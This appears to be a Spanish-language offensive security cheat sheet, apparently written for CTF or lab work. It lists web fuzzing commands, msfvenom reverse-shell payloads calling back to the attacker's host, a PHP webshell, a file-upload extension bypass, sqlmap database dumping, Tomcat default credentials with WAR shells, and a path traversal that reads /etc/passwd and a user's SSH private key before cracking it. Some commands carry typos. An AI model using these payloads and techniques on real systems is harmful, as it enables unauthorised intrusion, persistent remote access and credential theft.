## Fuzzing Web

### Gobuster

``` bash
gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php
```

### Wfuzz

``` bash
wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlisrts/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.IP.domain" -u IP

wfuzz -c --hc 404 --hl 10 -w /usr/share/wordlists/seclists/directory-list-lowercase-2.3-medium.txt http://IP/FUZZ

# dirb http://IP/
# dirsearch -u http://IP/
```

### Transferencia de zona (puerto 53)

``` bash
dig axfr url.domain @IP

# Diccionario de subdominios: /usr/share/wordlisrts/seclists/Discovery/DNS/bitquark-subdomains-top-100000.txt
```

## File Upload

### Payloads para file uploads

``` bash
msfvenom -p php/reverse_php LHOST=MiIP LPORT=443 -f raw > pwned.php

# Estas revshells funcionan mal, por lo que una vez el payload haga su trabajo, hacer una revshell con revchells.com y ejecutarla para que persista (bash -c "payload")
```

### WebShells

nano webshell.php
```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>":
?>
```

Cuando se suba el archivo podremos ejecutar comandos dentro de la ruta.
```http
http://IP/uploads/webshell.php?cmd=id 
```
De ahí podremos usar una revshell urlencodeada.
### Bypass restricción de file upload

Cambiar extensión de los archivos:
pwned.phtml
### Tratamiento de una shell

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
		reset xterm

export TERM=xterm
export SHELL=bash
stty rows 52 columns 204
```

## SQL map

```bash
sqlmap -u http://IP/ruta --forms --dbs --batch
sqlmap -u http://IP/ruta --forms -D database --tables --batch
sqlmap -u http://IP/ruta --forms -D database -T table --columns --batch
sqlmap -u http://IP/ruta --forms -D database -T table -C column,column --dump --batch
```

## Caso Tomcat

```bash
apahce tomcat default credentials: tomcat:s3cret # presoinar esc a veces revela las credenciales
msfvenom -p java/shell_reverse_php LHOST=MiIP LPORT=443 -f war > pwned.war
msfvenom -p java/jsp_shell_reverse_php LHOST=MiIP LPORT=443 -f war > pwned2.war
```

## Local File Inclusion

Cuando en una URL se este llamando a un recurso del servidor:
```http
http://IP/tools/check_if_exists.php?doc=../../../../../../../../../../../../../etc/passwd
```

Para explotar la vulnerabilidad y poder ganar acceso al servidor buscaremos un archivo id_rsa que nos dejara acceder por medio de ssh
```http
http://IP/tools/check_if_exists.php?doc=../../../../../../../../../../../../../home/ghost/.ssh/id_rsa
```

Crearemos un archivo id_rsa con permisos 600 para poderlo usar en ssh
```bash
ssh -i id_rsa ghost@IP 
```

Tambien deberemos de extraer la contraseña del id_rsa por medio de john
```bash
ssh2john id_rsa > hash

john --wordlist=/usr/share/wordlist/rockyou.txt hash
```
